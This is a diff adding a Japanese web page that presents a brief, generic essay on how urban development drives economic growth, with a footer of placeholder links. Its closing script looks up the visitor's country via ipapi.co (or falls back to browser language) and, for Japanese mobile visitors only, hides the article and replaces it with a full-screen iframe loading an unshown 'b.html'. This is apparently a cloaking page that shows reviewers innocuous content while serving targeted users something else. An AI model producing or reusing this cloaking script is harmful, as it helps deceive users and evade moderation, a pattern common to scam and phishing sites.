@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>都市発展が経済発展に与える影響</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: sans-serif;
+            line-height: 1.8;
+            color: #333;
+            background: #ffffff;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #4a90e2 0%, #357abd 100%);
+            color: white;
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: clamp(28px, 4vw, 48px);
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+
+        .main {
+            padding: 60px 0;
+        }
+
+        .section {
+            margin-bottom: 60px;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.1);
+            border: 1px solid #e9ecef;
+        }
+
+        .section h2 {
+            font-size: clamp(20px, 3vw, 28px);
+            color: #2c3e50;
+            margin-bottom: 25px;
+            font-weight: 600;
+            border-left: 4px solid #4a90e2;
+            padding-left: 20px;
+        }
+
+        .section p {
+            font-size: 16px;
+            line-height: 1.8;
+            color: #555;
+        }
+
+        .intro-section {
+            background: #f8f9fa;
+            border-left: 4px solid #28a745;
+        }
+
+        .numbered-section {
+            position: relative;
+            padding-left: 80px;
+        }
+
+        .number-badge {
+            position: absolute;
+            left: 20px;
+            top: 40px;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #4a90e2 0%, #357abd 100%);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .footer {
+            background: #2c3e50;
+            color: white;
+            padding: 40px 0 20px;
+            margin-top: 60px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .footer-section h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #4a90e2;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 8px;
+        }
+
+        .footer-section ul li a {
+            color: #bbb;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-section ul li a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #34495e;
+            padding-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #bbb;
+        }
+
+        .content {
+            display: block;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .section {
+                padding: 25px 20px;
+                margin-bottom: 30px;
+            }
+            
+            .main {
+                padding: 40px 0;
+            }
+
+            .numbered-section {
+                padding-left: 20px;
+            }
+
+            .number-badge {
+                position: relative;
+                left: 0;
+                top: 0;
+                margin-bottom: 15px;
+            }
+
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="content" class="content">
+        <header class="header">
+            <div class="container">
+                <h1>都市発展が経済発展に与える影響</h1>
+            </div>
+        </header>
+
+        <main class="main">
+            <div class="container">
+                <section class="section intro-section">
+                    <h2>序論</h2>
+                    <p>都市は経済活動の中核であり、都市発展のあらゆる側面が経済の成長と持続可能性に深く影響を与えています。</p>
+                </section>
+
+                <section class="section numbered-section">
+                    <div class="number-badge">1</div>
+                    <h2>人口集積と労働市場</h2>
+                    <p>都市は大量の人口を引き付け、豊富な労働市場を形成しています。高密度の人口集積により労働生産性の向上が促進され、企業に多様化した人材選択を提供しています。</p>
+                </section>
+
+                <section class="section numbered-section">
+                    <div class="number-badge">2</div>
+                    <h2>イノベーションと科学技術発展</h2>
+                    <p>都市はイノベーションの温床であり、大学、研究機関、企業が集中しています。科学技術イノベーションが都市内で迅速に普及し、新興産業の発展を推進し、全体的な経済競争力を向上させています。</p>
+                </section>
+
+                <section class="section numbered-section">
+                    <div class="number-badge">3</div>
+                    <h2>インフラ建設</h2>
+                    <p>都市発展はインフラ投資を促進し、交通、通信、公共サービス施設などが含まれます。これらの投資は住民の生活の質を向上させるだけでなく、企業にとって良好な経営環境も創出しています。</p>
+                </section>
+
+                <section class="section numbered-section">
+                    <div class="number-badge">4</div>
+                    <h2>消費市場の拡大</h2>
+                    <p>都市住民の消費能力は一般的に高く、都市の発展により小売業、サービス業、娯楽業などの繁栄が促進され、経済の多様化発展が促進されています。</p>
+                </section>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-section">
+                        <h3>サイト情報</h3>
+                        <ul>
+                            <li><a href="#">会社概要</a></li>
+                            <li><a href="#">サービス内容</a></li>
+                            <li><a href="#">お問い合わせ</a></li>
+                            <li><a href="#">採用情報</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div class="footer-section">
+                        <h3>法的情報</h3>
+                        <ul>
+                            <li><a href="#">プライバシーポリシー</a></li>
+                            <li><a href="#">利用規約</a></li>
+                            <li><a href="#">免責事項</a></li>
+                            <li><a href="#">クッキーポリシー</a></li>
+                        </ul>
+                    </div>
+                    
+                    <div class="footer-section">
+                        <h3>サポート</h3>
+                        <ul>
+                            <li><a href="#">よくある質問</a></li>
+                            <li><a href="#">ヘルプセンター</a></li>
+                            <li><a href="#">技術サポート</a></li>
+                            <li><a href="#">フィードバック</a></li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="footer-bottom">
+                    <p>&copy; 2024 都市経済研究所. All rights reserved. | 本サイトの内容は情報提供を目的としており、投資助言を構成するものではありません。</p>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function isJapaneseLanguage() {
+            const language = navigator.language || navigator.userLanguage;
+            return language.startsWith('ja');
+        }
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => { 
+                if (data.country === 'JP' && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
+            })
+            .catch(error => {
+                console.error('Error fetching IP data:', error);
+                if (isJapaneseLanguage() && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
+            });
+    </script>
+</body>
+</html>
